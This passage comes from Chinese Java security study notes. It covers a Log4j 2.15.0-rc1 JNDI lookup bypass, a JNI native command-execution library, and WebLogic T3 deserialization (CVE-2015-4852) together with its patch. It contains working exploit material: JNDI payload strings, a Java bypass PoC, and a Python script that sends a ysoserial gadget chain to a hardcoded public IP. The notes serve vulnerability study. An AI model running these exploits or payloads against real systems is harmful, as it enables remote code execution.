import org.apache.logging.log4j.core.config.builder.impl.DefaultConfigurationBuilder;
import org.apache.logging.log4j.core.impl.Log4jLogEvent;
import org.apache.logging.log4j.core.pattern.MessagePatternConverter;
import org.apache.logging.log4j.message.Message;
import org.apache.logging.log4j.message.ParameterizedMessage;

public class Bypass {
    public static void main(String[] args) {
        final Configuration config = new DefaultConfigurationBuilder().build(true);
        // 配置开启lookup功能
        final MessagePatternConverter converter = MessagePatternConverter.newInstance(config, new String[] {"lookups"});
        final Message msg = new ParameterizedMessage("${jndi:ldap://127.0.0.1:1389/poc}");
        final LogEvent event = Log4jLogEvent.newBuilder()
                .setLoggerName("MyLogger")
                .setLevel(Level.DEBUG)
                .setMessage(msg).build();
        final StringBuilder sb = new StringBuilder();
        converter.format(event, sb);
        System.out.println(sb);
    }
}
```

成功开启`lookups`功能，调用`LookupMessagePatternConverter.fomat`方法

![image-20220225152044248](img/image-20220225152044248.png)![image-20220225152044248](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225152044248.png?lastModify=1646033842)

跟进 `replaceIn`

递归处理等过程均没有变化，最后`JndiManager.lookup`触发漏洞的地方进行了修改

![image-20220225153141690](img/image-20220225153141690.png)![image-20220225153141690](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225153141690.png?lastModify=1646033842)

首先需要通过协议白名单和 hsot 白名单，

![image-20220225153425613](img/image-20220225153425613.png)![image-20220225153425613](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225153425613.png?lastModify=1646033842)

判断 `javaSerializedData` 是否为 null，还判断 `allowedClasses` ，这里为了防止 ldap 高版本绕过反序列化组件链。（比如 CC链这种的）。

![image-20220225153625713](img/image-20220225153625713.png)![image-20220225153625713](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225153625713.png?lastModify=1646033842)

这里不允许REFERENCE这种加载对象的方式。

看看这几个白名单

![image-20220225153805891](img/image-20220225153805891.png)![image-20220225153805891](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225153805891.png?lastModify=1646033842)

默认允许本地的 一些 ip。

![image-20220225153835376](img/image-20220225153835376.png)![image-20220225153835376](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225153835376.png?lastModify=1646033842)

默认允许的 classes 为基本数据类型。

![image-20220225153857604](img/image-20220225153857604.png)![image-20220225153857604](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225153857604.png?lastModify=1646033842)

默认允许的协议为 `java,ldap,ldaps`。

实际上拦住`Payload`是在最后一处`OBJECT_FACTORY`判断

![image-20220225154036425](img/image-20220225154036425.png)![image-20220225154036425](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225154036425.png?lastModify=1646033842)

由于RCE一定需要加载远程对象，那么避免不了`javaFactory`属性。

但是如果 `URI uri = new URI(name);` 发生异常，被捕获到，但并没有做任何处理，而实直接继续执行，`this.context.lookup(name);`

![image-20220225154150740](img/image-20220225154150740.png)![image-20220225154150740](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225154150740.png?lastModify=1646033842)

经测试，`URI`中不进行`URL`编码会报这个错，加个空格即可触发`${jndi:ldap://127.0.0.1:1389/ poc}`

（不对空格做编码导致异常，但是`lookup`时候会去掉这个空格）

![image-20220225154452692](img/image-20220225154452692.png)![image-20220225154452692](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225154452692.png?lastModify=1646033842)



**（需要用户开启`lookup`功能的基础上才可以）**

payload

```
${jndi:ldap://127.0.0.1:1389/\$Calc}
${jndi:ldap://127.0.0.1:1389/ Calc}
${jndi:ldap://127.0.0.1:1389/\u0000Calc}
```

https://xz.aliyun.com/t/10649

## RC2 修复

https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2

捕获到异常后进行处理，return，不会直接往下执行到之前的 lookup。

![image-20220225155245442](img/image-20220225155245442.png)![image-20220225155245442](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220225155245442.png?lastModify=1646033842)

## log4j2 DOS

在`2.15.0`版本利用的前提：该漏洞必须在开启`lookup`功能的情况下触发

一种常见的开启姿势是在`log4j2.xml`中：

```
<appenders>
    <console name="CONSOLE-APPENDER" target="SYSTEM_OUT">
        <PatternLayout pattern="%msg{lookups}%n"/>
    </console>
</appenders>
```



# codeql

https://github.com/safe6Sec/CodeqlNote









































# JNI

## 基础

Java语言是基于C语言实现的，Java底层很多API都是通过`JNI(Java Native Interface)` 来实现的。通过`JNI`接口，`C/c++`和`Java` 可以互相调用(存在跨平台问题)。Java可以通过 JNI 调用来弥补语言自身的不足 (代码安全性、内存操作等)。

## JNI-定义native方法

首先在 Java 中如果想要调用native方法，那么需要在类中先定义一个`native`方法，

`CommandExecution.java` ：

```
package jni;

public class CommandExecution {
    public static native String exec(String cmd);
}
```

需要使用`native` 关键字定义一个类似于接口得方法就可以了。

## JNI-生成类头文件

现在需要编译并生成C语言头文件。

完整步骤：

```
1. 定义 native 方法
2. javac8 -cp . jni/CommandExecution.java
3. javah8 -d jni/ -cp . jni.CommandExecution    
```

然后就会在 jni 下生成`jni_CommandExecution.h` 头文件和 class 文件了。

![image-20220124220355287](img/image-20220124220355287.png)![image-20220124220355287](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220124220355287.png?lastModify=1646033842)

> JDK10 移除了`javah`，需要改为`javac` 加 `-h` 参数的方式产生头文件。

JDK>=10

```
javac -cp . jni/CommandExecution.java -h jni/
```

`jni_CommandExecution.h` :

```
/* DO NOT EDIT THIS FILE - it is machine generated */
#include <jni.h>
/* Header for class jni_CommandExecution */

#ifndef _Included_jni_CommandExecution
#define _Included_jni_CommandExecution
#ifdef __cplusplus
extern "C" {
#endif
/*
 * Class:     jni_CommandExecution
 * Method:    exec
 * Signature: (Ljava/lang/String;)Ljava/lang/String;
 */
JNIEXPORT jstring JNICALL Java_jni_CommandExecution_exec
  (JNIEnv *, jclass, jstring);

#ifdef __cplusplus
}
#endif
#endif
```

可以使用IDE或者vim完成动态链接库的编写。

**头文件命名强制性**

> javah生成的头文件中的函数命名方式是有非常强制性的约束的，如`Java_com_anbai_sec_cmd_CommandExecution_exec`中`Java_`是固定的前缀，而`com_anbai_sec_cmd_CommandExecution`也就代表着Java的完整包名称:`com.anbai.sec.cmd.CommandExecution`，`_exec`自然是表示的方法名称了。`(JNIEnv *, jclass, jstring)`表示分别是`JNI环境变量对象`、`java调用的类对象`、`参数入参类型`。

## JNI-基础数据类型

Java和JNI定义的类型是需要转换的，不能直接使用Java里的类型，也不能直接讲JNI、C/C++ 的类型直接返回给 Java 。

惨重如下类型对照表：

| Java类型 | JNI类型  | C/C++类型      | 大小       |
| :------- | :------- | :------------- | :--------- |
| Boolean  | Jblloean | unsigned char  | 无符号8位  |
| Byte     | Jbyte    | char           | 有符号8位  |
| Char     | Jchar    | unsigned short | 无符号16位 |
| Short    | Jshort   | short          | 有符号16位 |
| Int      | Jint     | int            | 有符号32位 |
| Long     | Jlong    | long long      | 有符号64位 |
| Float    | Jfloat   | float          | 32位       |
| Double   | Jdouble  | double         | 64位       |

jstring转char*：`env->GetStringUTFChars(str, &jsCopy)`

char*转jstring: `env->NewStringUTF("Hello...")`

字符串资源释放: `env->ReleaseStringUTFChars(javaString, p);`

其他知识点参考：[jni中java与原生代码通信规则](https://blog.csdn.net/qq_25722767/article/details/52557235)

## JNI - 编写C/C++本地命令执行实现

上边，已经生成好了头文件，接下来我们需要使用C/C++ 编写函数的最终实现代码。

```
jni_CommandExecution.cpp
#include <iostream>
#include <stdlib.h>
#include <cstring>
#include <string>
#include "jni_CommandExecution.h"

using namespace std;

JNIEXPORT jstring

JNICALL Java_com_anbai_sec_cmd_CommandExecution_exec
        (JNIEnv *env, jclass jclass, jstring str) {

    if (str != NULL) {
        jboolean jsCopy;
        // 将jstring参数转成char指针
        const char *cmd = env->GetStringUTFChars(str, &jsCopy);

        // 使用popen函数执行系统命令
        FILE *fd  = popen(cmd, "r");

        if (fd != NULL) {
            // 返回结果字符串
            string result;

            // 定义字符串数组
            char buf[128];

            // 读取popen函数的执行结果
            while (fgets(buf, sizeof(buf), fd) != NULL) {
                // 拼接读取到的结果到result
                result +=buf;
            }

            // 关闭popen
            pclose(fd);

            // 返回命令执行结果给Java
            return env->NewStringUTF(result.c_str());
        }

    }

    return NULL;
}
```





[知识盒子](https://zhishihezi.net/endpoint/richtext/896bcdc6ac8e4284b30230834ab35d06?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00e771b2a87952c00b487c25dfe236a2d0c8464f3afcd4944572471c7443da8125aacf42e0e67115293b85870f7a00d098215105eeb7eba313bde4643360cd95df7c60549caf876059853364ce7599dda1cf1da83a6300f2040abffd21f820c64bbd738f998773b5099e4a8f1a079e7c221f42e8a5ccfe2367330c78a86cdf0917085b31b42892260b3c77829f5ad4fea0c92259e4add1c3356e0cec1c507754738ef376762237a75b1bd4fe0df4de863a1abda5d6595bb42ab2b85671225f676f#0)

# Weblogic T3协议

在Weblogic的反序列化漏洞中大致分为两种：

- 基于T3协议的反序列化漏洞
- 基于XML的反序列化漏洞

当然还有一些SSRF和任意文件上传漏洞。

基于T3协议的漏洞：CVE-2015-4580 , CVE-2016-0639 ,  CVE-2016-3510 ,  CVE-2018-2628  ,  CVE-2020-2555 ,  CVE-2020-3883

基于XML :  CVE-2017-3506  ,   CVE2017-10271  ,  CVE-2019-2729 

## T3协议

T3 协议是 Weblogic 里独有的一个协议，

RMI的传输过程是传输的序列化数据，而在接收后进行反序列化的操作，在Weblogic中对RMI规范的实现使用T3协议，传输过程也一样。

Weblogic进行反序列化的执行流程图：

![img](img/1993669-20201218162014099-612385399.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/1993669-20201218162014099-612385399.png?lastModify=1646033842)

入口点是Weblogic里面的方法调用了原生的反序列化方法进行反序列化操作。

#### 环境搭建

使用github上的环境：https://github.com/QAX-A-Team/WeblogicEnvironment

下载jdk压缩包和weblogic，然后把下载好的jdk文件放在该项目的jdks文件夹下，weblogic的源码放在weblogics文件夹下

这里直接下好环境后，使用 sh 脚本

```
sh run_weblogic1036jdk7u21.sh 
```

![image-20220125145738277](img/image-20220125145738277.png)![image-20220125145738277](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220125145738277.png?lastModify=1646033842)

sh脚本已经将jar从容器中拷贝出来。

依次将modules和wlserver添加进去即可

![image-20220125151831157](img/image-20220125151831157.png)![image-20220125151831157](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220125151831157.png?lastModify=1646033842)

![image-20220125151930466](img/image-20220125151930466.png)![image-20220125151930466](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220125151930466.png?lastModify=1646033842)

设置远程调试

![image-20220125152802914](img/image-20220125152802914.png)![image-20220125152802914](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220125152802914.png?lastModify=1646033842)

在`InboundMsgAbbrev#readObject` 打断点,然后使用 `WeblogicScan` 工具扫描

![image-20220125152926248](img/image-20220125152926248.png)![image-20220125152926248](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220125152926248.png?lastModify=1646033842)

成功进入断点。

环境搭建成功。

#### T3协议概述

RMI通过传输反序列化数据，接收数据后进行反序列化，正常RMI通信使用的是 JRMP 协议，而在 Weblogic 的RMI通信中使用的是 T3协议。

T3协议是weblogic独有的一个协议，相比于JRMP协议多了一些特性。

- 服务端可以持续追踪监控客户端是否存活(心跳机制)，通常心跳的间隔为 60 秒，服务端在超过 240 秒未收到心跳即判定与客户端的连接丢失。
- 通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。

#### T3协议结构

在T3协议中包含 `请求包头` 和 `请求主体` 两部分内容。

**请求包头**

```
t3 12.2.1
AS:255
HL:19
MS:10000000
```

weblogic 响应

```
import socket

def T3Test(ip,port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n" #请求包的头
    sock.sendall(handshake.encode())
    while True:
        data = sock.recv(1024)
        print(data.decode())

if __name__ == "__main__":
    ip = "39.105.129.189"
    port = 7001

    T3Test(ip,port)
```

![image-20220125120640756](img/image-20220125120640756.png)![image-20220125120640756](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220125120640756.png?lastModify=1646033842)

HELO 后面的为 Weblogic 版本号。

**请求主体**

T3协议里面传输的都是序列化数据，而传输中的数据分为 7 部分内容。

第一部分为协议头。

weblogic发送的JAVA序列化数据格式如下图。

![pic](img/e2f815467fd3abb3354bd6f0fee1402af6c6b305.jpg)![pic](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/e2f815467fd3abb3354bd6f0fee1402af6c6b305.jpg?lastModify=1646033842)

weblogic发送的JAVA序列化数据分为7个部分，第一部分的前四个字节为整个数据包的长度(1711=0x6AF)，第二至七部分均为JAVA序列化数据。

![pic](img/437dda72ddf4cda67306b11d5a13220080f99dd7.jpg)![pic](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/437dda72ddf4cda67306b11d5a13220080f99dd7.jpg?lastModify=1646033842)

看到第二到第七部分，都是`ac ed 00 05` ，说明该串内容是序列化的数据，而如果需要去构造paylaod的话，需要在后面序列化的内容中进行一个替换。讲原本存在的序列化内容替换成我们的 payload的序列化内容，在传输完成后，进行反序列化达成攻击的目的。

```
第一种生成方式：将weblogic发送的Java序列化数据的第二到第七部分的Java序列化数据的任意一个替换为恶意的序列化数据。
第二种生成方式：将weblogic发送的Java序列化数据的第一部分与恶意的序列化数据进行拼接。
```

#### 漏洞复现

用 CC1 来检测，用创建文件的方式检验反序列化是否成功

```
from os import popen
import struct # 负责大小端的转换
import subprocess
from sys import stdout
import socket
import re
import binascii

def generatePayload(gadget,cmd):
    YSO_PATH = "ysoserial.jar"
    popen = subprocess.Popen(['java8','-jar',YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)
    return popen.stdout.read()

def T3Exploit(ip,port,payload):
    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((ip,port))
    handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"
    sock.sendall(handshake.encode())
    data = sock.recv(1024)
    data += sock.recv(1024)
    print(data.decode())
    compile = re.compile("HELO:(.*).0.false")
    match = compile.findall(data.decode())
    if match:
        print("Weblogic: "+"".join(match))
    else:
        print("Not Weblogic")
        #return
    header = binascii.a2b_hex(b"00000000")
    t3header = binascii.a2b_hex(b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006")
    desflag = binascii.a2b_hex(b"fe010000")
    payload = header + t3header  +desflag+  payload
    payload = struct.pack(">I",len(payload)) + payload[4:]
    sock.send(payload)

if __name__ == "__main__":
    ip = "39.105.129.189"
    port = 7001
    gadget = "CommonsCollections1"
    cmd = "touch /tmp/success"
    payload = generatePayload(gadget,cmd)
    T3Exploit(ip,port,payload)
```

成功创建

![image-20220125155957376](img/image-20220125155957376.png)![image-20220125155957376](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220125155957376.png?lastModify=1646033842)

#### 复现

使用过滤器`tcp.port == 7001`

![image-20220125160206467](img/image-20220125160206467.png)![image-20220125160206467](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220125160206467.png?lastModify=1646033842)

追踪TCP流

![image-20220125160455344](img/image-20220125160455344.png)![image-20220125160455344](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220125160455344.png?lastModify=1646033842)

看第三个数据包，主要有四部分组成

1. 数据包长度

2. T3协议头

3. 反序列化标志： T3协议中每个反序列化数据包前面都带有`fe 01 00 00` ，再加上反序列化标志`ac ed 00 05` 就变成`fe 01 00 00 ac ed 00 05`

   如图

![image-20220125160755808](img/image-20220125160755808.png)![image-20220125160755808](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220125160755808.png?lastModify=1646033842)

分析poc:

将 ysoserial 生成的payload变成 t3 协议里的数据格式。

```
from os import popen
import struct # 负责大小端的转换
import subprocess
from sys import stdout
import socket
import re
import binascii

# 生成 ysoserial paylaod
def generatePayload(gadget,cmd):
    YSO_PATH = "ysoserial.jar"
    popen = subprocess.Popen(['java8','-jar',YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)
    return popen.stdout.read()

def T3Exploit(ip,port,payload):
    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((ip,port))
    handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"
    sock.sendall(handshake.encode())
    data = sock.recv(1024)
    data += sock.recv(1024)
    print(data.decode())
    compile = re.compile("HELO:(.*).0.false")
    match = compile.findall(data.decode())
    if match:
        print("Weblogic: "+"".join(match))
    else:
        print("Not Weblogic")
        #return
    # 1. 占位符保证总长度计算正确
    header = binascii.a2b_hex(b"00000000")
    # 2. 固定T3协议头
    t3header = binascii.a2b_hex(b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006")
    # 3. weblogic 反序列化数据的标志
    desflag = binascii.a2b_hex(b"fe010000")
    # 4. 跟 ysoserial 生成的paylaod 拼接起来
    payload = header + t3header  +desflag+  payload
    # 5. 计算出长度替换原来占位的字符， 前四位
    payload = struct.pack(">I",len(payload)) + payload[4:]
    sock.send(payload)

if __name__ == "__main__":
    ip = "39.105.129.189"
    port = 7001
    gadget = "CommonsCollections1"
    cmd = "touch /tmp/success"
    payload = generatePayload(gadget,cmd)
    T3Exploit(ip,port,payload)
```

## CVE-2015-4852 分析

`weblogic.rjvm.InboundMsgAbbrev#readObject` 下断点，

![image-20220125163231649](img/image-20220125163231649.png)![image-20220125163231649](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220125163231649.png?lastModify=1646033842)

`InboundMsgAbbrev.ServerChannelInputStream#readObject` :

ServerChannelInputStream 是`ObjectInputStream` 的子类，这里重写了 resolveClass ，但是实际上调用的还是父类`ObjectInputStream`的 resolveClass方法，相当于没有做任何防御，导致漏洞出现。

```
Class var2 = super.resolveClass(var1);  // 调用父类 resolveClass
```

![image-20220125165029465](img/image-20220125165029465.png)![image-20220125165029465](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220125165029465.png?lastModify=1646033842)

![image-20220125163516146](img/image-20220125163516146.png)![image-20220125163516146](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220125163516146.png?lastModify=1646033842)

在导入的依赖中可以看到这个版本自带 CommonsCollections3.2.0 ,符合CC1 链的条件。

![image-20220125163626062](img/image-20220125163626062.png)![image-20220125163626062](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220125163626062.png?lastModify=1646033842)

> 那么现在有一个问题，为什么说resolveClass可以防御Java反序列化？

#### resolveClass作用

`resovleClass` 方法的作用是将类的序列化描述符加工成该类的Class对象。

![image-20220125164104595](img/image-20220125164104595.png)![image-20220125164104595](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220125164104595.png?lastModify=1646033842)

**因为对应的Class对象是在resolveClass这里返回的，所以这里是防御的反序列化的关键。**

重写 resolveClass 然后在里面添加一个类的黑名单，发现类在黑名单中就抛出异常，这样就无法获取恶意类的Class对象，此方法一定程度上可以防御反序列化。

如图，

![image-20220125164459441](img/image-20220125164459441.png)![image-20220125164459441](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220125164459441.png?lastModify=1646033842)

#### 修复

补丁：2016年1月 p21984589_1036_Generic

修复方法是在`resolveClass`中引入了 ClassFilter.isBlackListed 进行过滤，跟进`weblogic.rmi.ClassFilter` 可以看到黑名单内容。

![image.png](img/1584603275786-9f17f890-175d-49f5-95da-7eeaa1fcc48e.png)![image.png](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/1584603275786-9f17f890-175d-49f5-95da-7eeaa1fcc48e.png?lastModify=1646033842)

可以看到这里它没有去调用父类的`resolveClass`，同时`ServerChannelInputStream#resolveClass` 做了黑名单处理。

![image.png](img/1584933120054-b1f0b1cc-f9a7-4e35-a591-27af88d29ab2.png)![image.png](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/1584933120054-b1f0b1cc-f9a7-4e35-a591-27af88d29ab2.png?lastModify=1646033842)

反序列化两个关键点：

- 触发反序列化的点
- gadget

现在反序列化触发点有，那么后面就是 绕黑名单了。

修复方案还有

> 开放在外网的情况下，还可以采用web代理和负载均衡。
>
> web代理的方式只能转发HTTP的请求，而不会转发T3协议的请求，这就能防御住T3漏洞的攻击。
>
> 而负载均衡的情况下，可以指定需要进行负载均衡的协议类型，这么这里就可以设置为HTTP的请求，不接收其他的协议请求转发。这也是在外网中见到T3协议漏洞比较少的原因之一。

[http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/](http://redteam.today/2020/03/25/weblogic历史T3反序列化漏洞及补丁梳理/)

https://xz.aliyun.com/t/10365

http://drops.xmd5.com/static/drops/web-13470.html

https://www.cnblogs.com/nice0e3/p/14201884.html

## CVE-2016-0638

CVE-2015-4582 的修复补丁为`p21984589_1036_Generic` ，这个补丁需要付费用户才能下载，但可以使用`p20780171_1036_Generic`和p22248372_1036012_Generic 这两个补丁包，`p21984589_1036_Generic`是前面这两个补丁包的集成。

但是补丁好像都需要付费.......